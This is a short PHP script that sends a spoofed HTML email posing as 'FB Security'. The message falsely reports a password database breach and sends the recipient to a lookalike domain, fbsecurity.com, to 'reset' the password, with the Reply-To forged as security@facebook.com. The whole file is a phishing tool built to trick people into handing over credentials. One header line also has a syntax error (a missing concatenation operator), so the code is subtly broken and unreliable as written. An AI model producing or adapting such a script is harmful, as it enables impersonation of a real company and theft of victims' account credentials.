<?php
$from = "reallookingemail@fbsecurity.com";
$to = "targetemail@gmail.com";
$display = "FB Security";
$subject = "Password Data Breach";
$message = '<h5>Data Breached</h5><p>Unfortunately we\'ve recently suffered a password database breach on our system, please change your password by following this link. <br><br>Please open this link in your browser or click on the link to automatically be taken to the address.<br><a href="fbsecurity.com/">Password Reset</a></p>';
$reply = "security@facebook.com";

header('Content-type: text/plain;');
$ok = sendSpoofMail($to,$from,$display,$subject,$message,$reply);

echo $ok ? "Sending Passed":"Sending Failed";

function sendSpoofMail($to,$from, $display,$subject,$message,$reply)
{
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

$headers .= 'From: '.$display.' <'.$from'>'."\r\n".
    'Reply-To: '.$reply."\r\n" .
    'X-Mailer: PHP/' . phpversion();

$msg  = '<html><body>';
$msg .= $message;
$msg .= '</body></html>';

  if(mail($to, $subject, $msg, $headers)){
             return true;
              } else{
             return false;
     }

}
?>
